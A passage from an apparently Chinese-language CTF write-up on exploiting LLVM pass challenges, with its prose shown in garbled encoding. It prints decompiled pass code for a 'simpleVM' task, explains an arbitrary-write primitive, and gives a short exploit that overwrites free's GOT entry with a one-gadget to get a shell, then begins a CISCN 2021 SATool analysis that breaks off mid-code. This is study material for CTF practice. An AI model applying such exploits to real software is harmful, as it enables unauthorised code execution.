[rbp-1B0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  llvm::ConstantInt *v9; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  llvm::ConstantInt *v12; <span class="comment">// [rsp+50h] [rbp-180h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-170h]</span></span><br><span class="line">  llvm::ConstantInt *v15; <span class="comment">// [rsp+68h] [rbp-168h]</span></span><br><span class="line">  _QWORD *v16; <span class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  llvm::ConstantInt *v19; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  <span class="type">void</span> *v20; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  llvm::ConstantInt *v23; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">void</span> *v24; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  llvm::ConstantInt *v27; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *v28; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  __int64 ZExtValue; <span class="comment">// [rsp+140h] [rbp-90h]</span></span><br><span class="line">  llvm::ConstantInt *v31; <span class="comment">// [rsp+148h] [rbp-88h]</span></span><br><span class="line">  _QWORD *v32; <span class="comment">// [rsp+150h] [rbp-80h]</span></span><br><span class="line">  __int64 ArgOperand; <span class="comment">// [rsp+158h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+168h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v35; <span class="comment">// [rsp+170h] [rbp-60h]</span></span><br><span class="line">  llvm::Instruction *v36; <span class="comment">// [rsp+180h] [rbp-50h]</span></span><br><span class="line">  _QWORD *Name; <span class="comment">// [rsp+1A8h] [rbp-28h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1B8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v39[<span class="number">2</span>]; <span class="comment">// [rsp+1C0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::<span class="built_in">getOpcode</span>(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = (llvm::CallBase *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::<span class="built_in">getCalledFunction</span>(v35);</span><br><span class="line">        Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br><span class="line">        *(_QWORD *)s1 = *Name;</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOperand = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v32 = <span class="number">0LL</span>;</span><br><span class="line">            v31 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">            <span class="keyword">if</span> ( v31 )</span><br><span class="line">            &#123;</span><br><span class="line">              ZExtValue = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v31);</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">                v32 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">                v32 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v32 )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = off_20DFD8;</span><br><span class="line">              *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">              *v3 = (<span class="type">char</span> *)*v3 - <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v28 = <span class="number">0LL</span>;</span><br><span class="line">            v27 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v29);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              v26 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v27);</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">                v28 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">2</span> )</span><br><span class="line">                v28 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v28 )</span><br><span class="line">            &#123;</span><br><span class="line">              v4 = off_20DFD8;</span><br><span class="line">              *off_20DFD8 = (<span class="type">char</span> *)*off_20DFD8 + <span class="number">8</span>;</span><br><span class="line">              *(_QWORD *)*v4 = *v28;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v24 = <span class="number">0LL</span>;</span><br><span class="line">            v23 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">            <span class="keyword">if</span> ( v23 )</span><br><span class="line">            &#123;</span><br><span class="line">              v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v20 = <span class="number">0LL</span>;</span><br><span class="line">            v19 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">            <span class="keyword">if</span> ( v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">              *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">              *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v16 = <span class="number">0LL</span>;</span><br><span class="line">            v15 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">            <span class="keyword">if</span> ( v15 )</span><br><span class="line">            &#123;</span><br><span class="line">              v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">                v16 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">                v16 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">              v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">              <span class="keyword">if</span> ( v12 )</span><br><span class="line">                *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">          v10 = <span class="number">0LL</span>;</span><br><span class="line">          v9 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">          <span class="keyword">if</span> ( v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">              v10 = off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">              v10 = off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">            v6 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">            <span class="keyword">if</span> ( v6 )</span><br><span class="line">              *v10 -= llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v6);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(s1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v39,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬ç»ˆäºå¯ä»¥çŸ¥é“ä¸ºä»€ä¹ˆé¢˜ç›®çš„åå­—å«<code>simpleVM</code>äº†ï¼Œè¿™å°±æ˜¯å¾ˆç»å…¸çš„<code>VMpwn</code>ï¼Œåªä¸è¿‡å’Œ<code>llvm pass</code>ç›¸ç»“åˆè€Œå·²ã€‚è¿™ä¸ªå‡½æ•°å®ç°äº†<code>push</code>ã€<code>pop</code>ã€<code>store</code>ã€<code>load</code>ã€<code>add</code>æŒ‡ä»¤åŠŸèƒ½ã€‚ä¸ºäº†æ–¹ä¾¿çœ‹æ‡‚ä»£ç ï¼Œè¿™é‡Œå…ˆç®€å•åˆ†æå‡ ä¸ª<code>llvm pass</code>ä¸­çš„å‡½æ•°ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br></pre></td></tr></table></figure><p>è·å–å‡½æ•°çš„åå­—å¹¶èµ‹å€¼ç»™<code>Name</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br></pre></td></tr></table></figure><p>è·å–å‡½æ•°çš„ä¸€ä¸ªå‚æ•°å¹¶å°†å…¶èµ‹å€¼ç»™<code>v8</code><br>è¿™é‡Œæˆ‘é€‰æ‹©ä½¿ç”¨<code>add</code>ã€<code>store</code>ã€<code>load</code>ç›¸äº’é…åˆæ¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä¸‹é¢ç»™å‡ºå…³é”®ä»£ç ç‰‡æ®µ  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// store</span></span><br><span class="line"><span class="keyword">if</span> ( v23 )&#123;</span><br><span class="line">    v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">    v24 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">    v24 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v24 == off_20DFD0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// load</span></span><br><span class="line"><span class="keyword">if</span> ( v19 )&#123;</span><br><span class="line">    v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">    v20 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">    v20 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">    *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">    *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          </span><br><span class="line"><span class="comment">// add</span></span><br><span class="line"><span class="keyword">if</span> ( v15 )&#123;</span><br><span class="line">    v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">    v16 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">    v16 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v16 )&#123;</span><br><span class="line">    v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">    v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­¦è¿‡<code>VMpwn</code>çš„å¸ˆå‚…ä¼šå‘ç°ï¼Œè¿™é‡Œå¯ä»¥å¾ˆå®¹æ˜“çš„å®ç°ä»»æ„åœ°å€å†™<br>æˆ‘ä»¬å‰é¢<code>checksec</code>å‘ç°<code>opt-8</code>å¹¶æ²¡æœ‰å¼€å¯<code>PIE</code>ä¿æŠ¤ä»¥åŠ<code>got</code>è¡¨å¯å†™ã€‚é€šè¿‡åˆ†æï¼Œåœ¨è¯¥å…³é”®å‡½æ•°æ¯è®ºå¾ªç¯ç»“æŸæ—¶éƒ½ä¼šæ‰§è¡Œ<code>free</code>å‡½æ•°ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¿®æ”¹â€å¯„å­˜å™¨â€çš„å€¼ä¸º<code>got</code>è¡¨åœ°å€ï¼Œç„¶åå°†é‡Œé¢çš„å€¼è¯»è¿›â€å¯„å­˜å™¨â€ï¼Œç„¶åå†åˆ©ç”¨<code>add</code>å‡½æ•°å°†â€å¯„å­˜å™¨â€é‡Œçš„<code>free</code>å‡½æ•°æ”¹æˆ<code>onegadget</code>ï¼Œæœ€åå†™å›<code>free</code>çš„<code>got</code>è¡¨ä¸­ï¼Œç¨‹åºè°ƒç”¨<code>free</code>å³å¯æ‰§è¡Œ<code>onegadget</code>ã€‚æœ€ç»ˆçš„<code>exp</code>å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);  </span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ‰§è¡Œ<code>./opt-8 -load ./VMPass.so -VMPass ./exp.ll</code>å³å¯<code>getshell</code><br>ç”±äºæ²¡æœ‰åœ¨æ¯”èµ›ä¸­é‡åˆ°è¿‡è¿™ç§é¢˜ç›®ï¼Œæ‰€ä»¥ä¸çŸ¥é“è¿œç¨‹æ˜¯æ€ä¹ˆæ‰“çš„ã€‚å¬åˆ«çš„å¸ˆå‚…è¯´ï¼Œå¥½åƒå’Œ<code>kernel pwn</code>å’Œ<code>qemu</code>é€ƒé€¸ä¸€æ ·ï¼Œéƒ½æ˜¯ç›´æ¥ä¸Šä¼ ä¸€ä¸ª<code>elf</code>  </p><h3 id="CISCN-2021-SATool"><a href="#CISCN-2021-SATool" class="headerlink" title="[CISCN 2021] SATool"></a>[CISCN 2021] SATool</h3><p>é¦–å…ˆè¿˜æ˜¯æŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•å®šä½åˆ°è¢«è¿›è¡Œä¿®æ”¹è¿‡çš„<code>runOnFunction</code>å‡½æ•°ä¸º<code>sub_19D0</code>ï¼Œç‚¹å¼€ä¸€çœ‹<code>500</code>å¤šè¡Œä»£ç ï¼Œç›´æ¥çœ‹çš„å¤´å¤§ï¼Œè¿™æ—¶å€™å°±ååˆ†çš„è€ƒéªŒæˆ‘ä»¬å¯¹å…³é”®ä»£ç çš„å®šä½äº†<br>é¦–å…ˆåœ¨æœ€å‰é¢  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>((llvm::Value *)a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">8</span> &amp;&amp; *Name == <span class="string">&#x27;r0oDkc4B&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a2[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v4 != (llvm::Value *)(a2 + <span class="number">9</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="type">char</span> *)v4 - <span class="number">24</span>;</span><br><span class="line">        v82 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">          v5 = <span class="number">0LL</span>;</span><br><span class="line">        v6 = *((_QWORD *)v5 + <span class="number">6</span>);</span><br><span class="line">        v7 = v5 + <span class="number">40</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">char</span> *)v6 != v7 )</span><br></pre></td></tr></table></figure><p>ä»ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¦ä¸€å®šè¦æœ‰åä¸º<code>B4ckDo0r</code>ï¼ˆå°ç«¯åºï¼‰çš„å‡½æ•°æ‰å¯ä»¥è¿›è¡Œåé¢çš„æ“ä½œ<br>åé¢çš„ç¨‹åºå¤§æ¦‚å¯ä»¥çœ‹å‡ºï¼Œæ ¹æ®B4ckDo0rä¸­è°ƒç”¨ä¸åŒçš„å‡½æ•°ä»è€Œæ¥æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼Œæ¥ä¸‹æ¥è¿›è¡Œè¯¦ç»†çš„åˆ†æ<br>æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å¦‚æœä¼ å…¥çš„æ˜¯<code>run</code>å‡½æ•°ï¼Œä»–æ‰€æ‰§è¡Œçš„ç¨‹åºä¸­å­˜åœ¨ä»¥ä¸‹è¿™æ®µä»£ç ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span 